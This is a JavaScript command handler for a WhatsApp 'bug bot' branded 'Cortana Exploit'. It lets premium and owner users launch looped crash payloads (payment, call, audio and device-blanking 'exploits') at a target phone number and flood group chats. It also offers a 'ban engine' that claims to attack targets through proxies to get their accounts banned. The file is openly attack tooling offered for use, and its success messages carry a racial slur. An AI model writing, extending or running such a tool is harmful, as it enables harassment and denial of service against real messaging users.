/**
 * ═══════════════════════════════════════════════════════════════
 * ☠️ CORTANA EXPLOIT - Bug Bot Handler
 * Main command processor for Bug Bot
 * ═══════════════════════════════════════════════════════════════
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const config = require('./config');

// Import all exploit functions
const {
    FcOneMesYgy,
    ElmiForceV1,
    ElmiForceMsgV1,
    TzXAudio,
    SpcmUi,
    BlankSpam,
    BugGb12,
    R9XKillGc
} = require('./bugbot');

// ═══════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Load JSON database file
 */
function loadDatabase(filePath, defaultValue = []) {
    try {
        if (fs.existsSync(filePath)) {
            return JSON.parse(fs.readFileSync(filePath, 'utf8'));
        }
    } catch (e) {
        console.error(`[DB] Error loading ${filePath}:`, e.message);
    }
    return defaultValue;
}

/**
 * Save JSON database file
 */
function saveDatabase(filePath, data) {
    try {
        const dir = path.dirname(filePath);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        return true;
    } catch (e) {
        console.error(`[DB] Error saving ${filePath}:`, e.message);
        return false;
    }
}

// ═══════════════════════════════════════════════════════════════
// MAIN HANDLER EXPORT
// ═══════════════════════════════════════════════════════════════

module.exports = bugHandler = async (sock, m, chatUpdate, store) => {
    try {
        // ═══════ MESSAGE PARSING ═══════
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage?.caption || "" :
                    m.mtype === "videoMessage" ? m.message.videoMessage?.caption || "" :
                        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage?.text || "" :
                            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage?.selectedButtonId || "" :
                                m.mtype === "listResponseMessage" ? m.message.listResponseMessage?.singleSelectReply?.selectedRowId || "" :
                                    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage?.selectedId || "" :
                                        m.mtype === "interactiveResponseMessage" ? (m.msg?.nativeFlowResponseMessage?.paramsJson ?
                                            (() => { try { return JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson); } catch { return {}; } })()?.id || "" : "") :
                                            m.mtype === "messageContextInfo" ? (m.message.buttonsResponseMessage?.selectedButtonId ||
                                                m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text || "") : ""
        ) || "";

        const sender = m.key.fromMe ?
            (sock.user?.id?.split(":")[0] || sock.user?.id) + "@s.whatsapp.net" || sock.user?.id :
            m.key.participant || m.key.remoteJid;

        const senderNumber = sender?.split('@')[0] || "";
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from?.endsWith("@g.us") || false;
        const botNumber = sock.decodeJid ? await sock.decodeJid(sock.user?.id || "") : sock.user?.id || "";

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(" ");
        const q = text;

        // ═══════ DATABASE LOADING ═══════
        let premium = loadDatabase(config.premiumPath);
        let owner = loadDatabase(config.ownerPath);

        const isPremium = premium.includes(m.sender);
        const isCreator = [botNumber, ...owner, ...(config.owner || [])
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')]
            .includes(m.sender);

        // ═══════ VERIFIED BADGE CONTEXT ═══════
        const qchannel = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: config.newsletter.jid,
                    newsletterName: config.newsletter.name,
                    jpegThumbnail: "",
                    caption: `📲 ${config.branding.footer}`,
                    inviteExpiration: 0
                }
            }
        };

        // ═══════ REPLY FUNCTIONS ═══════
        async function zreply(teks) {
            return await sock.sendMessage(m.chat, {
                text: `☠️ *CORTANA EXPLOIT*\n━━━━━━━━━━━━\n${teks}\n\n${config.branding.footer}`,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        }

        const reaction = async (jidss, emoji) => {
            await sock.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        };

        // ═══════ SUCCESS MESSAGE TEMPLATES ═══════
        const cortanaExploitSuccess = async (target, cmdUsed) => {
            const successMsg = `╔══════════════════════╗
║  ☠️ 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐄̸͜𝐗̸͜𝐏̸͜𝐋̸͜𝐎̸͜𝐈̸͜𝐓̸͜ ☠️  ║
╠══════════════════════╣
║ 💀 𝐏͢𝐀͠𝐘͡𝐋͢𝐎͠𝐀͡𝐃 𝐎͢𝐕͠𝐄͡𝐑͢𝐋͠𝐎͡𝐀͢𝐃 💀
║ ✅ Successfully sent to target!
║
║ 🎯 Target: ${target}
║ ⚔️ Command: ${cmdUsed}
║
║ ⚠️ Please wait 10 min before
║ processing another request
║ or you get banned nigga! 🔥
╚══════════════════════╝
${config.branding.footer}`;

            await sock.sendMessage(m.chat, {
                text: successMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        };

        const cortanaBanSuccess = async (target, cmdUsed) => {
            const banMsg = `╔══════════════════════╗
║  🦠 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐁̸͜𝐀̸͜𝐍̸͜ 🦠  ║
╠══════════════════════╣
║ 🔥 Oh! oo, Cortana is attacking
║ using proxies on your target!
║
║ 🎯 Target: ${target}
║ ⚔️ Method: ${cmdUsed}
║
║ ⏳ Wait for some hours, I'll
║ notify you with progress and
║ action taken!
║
║ 💬 Got questions? Reach out:
║ 📲 t.me/eduqariz
╚══════════════════════╝
☠️ CORTANA EXPLOIT | © 2026`;

            await sock.sendMessage(m.chat, {
                text: banMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        };

        // ═══════ COMMAND SWITCH ═══════
        switch (command) {

            // ═══════ MENU COMMAND ═══════
            case 'menu': {
                await reaction(m.chat, "😈");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "✅");

                const menu = `\`╭─[ ☠️ 𝐂𝐎𝐑𝐓𝐀𝐍𝐀 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ]\`
\`│\` *Version* : ${config.version}
\`│\` *Status* : ${config.status.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞'}
\`│\` *Access* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬"}
\`╰────────────────㋡︎\`

\`╭─[ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
\`│\` ▢ ${prefix}oneterm 62xxx
\`│\` ▢ ${prefix}cortanacall 62xxx
\`│\` ▢ ${prefix}trashem 62xxx
\`│\` ▢ ${prefix}newyear 62xxx
\`│\` ▢ ${prefix}edudevice 62xxx
\`│\` ▢ ${prefix}kindiki 62xxx
\`╰────❍\`

\`╭─[ 𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
\`│\` ▢ ${prefix}kufeni - inplace
\`│\` ▢ ${prefix}fuckall - inplace
\`│\` ▢ ${prefix}cookall - inplace
\`╰────❍\`

\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐧͠𝐠͡𝐢͢𝐧͠𝐞 ]\`
\`│\` ▢ ${prefix}perm-ban-num 62xxx
\`│\` ▢ ${prefix}temp-ban-num 62xxx
\`╰────❍\`

\`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
\`│\` ▢ ${prefix}addprem 62xxx
\`│\` ▢ ${prefix}delprem 62xxx
\`│\` ▢ ${prefix}listprem
\`╰────❍\`
`;

                await sock.sendMessage(m.chat, {
                    text: menu,
                    contextInfo: {
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: config.newsletter.jid,
                            newsletterName: config.newsletter.name,
                            serverMessageId: config.newsletter.serverMessageId
                        }
                    }
                }, { quoted: qchannel });
                break;
            }

            // ═══════ EXPLOIT COMMANDS (NO ALIASES) ═══════

            // .oneterm - Payment crash
            case 'oneterm': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                for (let i = 0; i < 5; i++) {
                    await FcOneMesYgy(sock, target);
                    await sleep(100);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .cortanacall - Encrypted call exploit
            case 'cortanacall': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.defaultLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .trashem - Payment message exploit
            case 'trashem': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                for (let i = 0; i < 5; i++) {
                    await ElmiForceMsgV1(sock, target);
                    await sleep(100);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .newyear - Crash home combo
            case 'newyear': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BlankSpam(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BugGb12(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .edudevice - Device blanking
            case 'edudevice': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BlankSpam(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .kindiki - Delay hard audio
            case 'kindiki': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.defaultLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // ═══════ GROUP COMMANDS (NO ALIASES) ═══════

            // .kufeni - Group payment crash
            case 'kufeni': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const target = m.chat;
                await R9XKillGc(sock, target, false);

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // .fuckall - Group newsletter spam
            case 'fuckall': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await sleep(1000);
                }

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // .cookall - Same as fuckall
            case 'cookall': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await sleep(1000);
                }

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // ═══════ BAN ENGINE COMMANDS ═══════
            case 'perm-ban-num': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (!text) {
                    return zreply(`— example: ${prefix + command} 62xxx`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "🔥");

                try {
                    const { CortanaDoomsday } = require('./ban-engine');
                    const banEngine = new CortanaDoomsday();

                    await sock.sendMessage(m.chat, {
                        text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
                    });

                    const result = await banEngine.executePermanentBan(target);

                    await reaction(m.chat, "✅");
                    await cortanaBanSuccess(bijipler, command);

                } catch (error) {
                    console.error('[BAN] Error:', error);
                    await reaction(m.chat, "❌");
                    zreply(`*Ban execution failed: ${error.message}*`);
                }
                break;
            }

            case 'temp-ban-num': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (!text) {
                    return zreply(`— example: ${prefix + command} 62xxx`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "⚡");

                try {
                    const { CortanaDoomsday } = require('./ban-engine');
                    const banEngine = new CortanaDoomsday();

                    await sock.sendMessage(m.chat, {
                        text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
                    });

                    const result = await banEngine.executeTemporaryBan(target);

                    await reaction(m.chat, "✅");
                    await cortanaBanSuccess(bijipler, command);

                } catch (error) {
                    console.error('[BAN] Error:', error);
                    await reaction(m.chat, "❌");
                    zreply(`*Ban execution failed: ${error.message}*`);
                }
                break;
            }

            // ═══════ OWNER COMMANDS ═══════
            case 'addprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (!args[0]) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '');
                if (phoneNumber.length < 10) return zreply(`Invalid number`);

                const anj = phoneNumber + `@s.whatsapp.net`;

                try {
                    let ceknya = await sock.onWhatsApp(anj);
                    if (!ceknya || ceknya.length == 0) {
                        return zreply(`Number not registered on WhatsApp`);
                    }
                } catch (error) {
                    return zreply(`Error checking WhatsApp number`);
                }

                premium.push(anj);
                saveDatabase(config.premiumPath, premium);
                zreply(`*Successfully added premium access*`);
                break;
            }

            case 'delprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (args.length < 1) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = args[0].replace(/[^0-9]/g, '');
                const targetJid = phoneNumber + "@s.whatsapp.net";
                const index = premium.indexOf(targetJid);

                if (index !== -1) {
                    premium.splice(index, 1);
                    saveDatabase(config.premiumPath, premium);
                    zreply(`*Successfully removed premium access*`);
                } else {
                    zreply(`User not found in premium database`);
                }
                break;
            }

            case 'listprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                let teks = '*PREMIUM USERS:*\n\n';
                for (let i = 0; i < premium.length; i++) {
                    teks += `${i + 1}. ${premium[i].split('@')[0]}\n`;
                }
                zreply(teks);
                break;
            }

            default:
                // Unknown command - do nothing
                break;
        }

    } catch (err) {
        console.error("[BugHandler] Error:", err);
    }
};

// Hot reload support
const file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
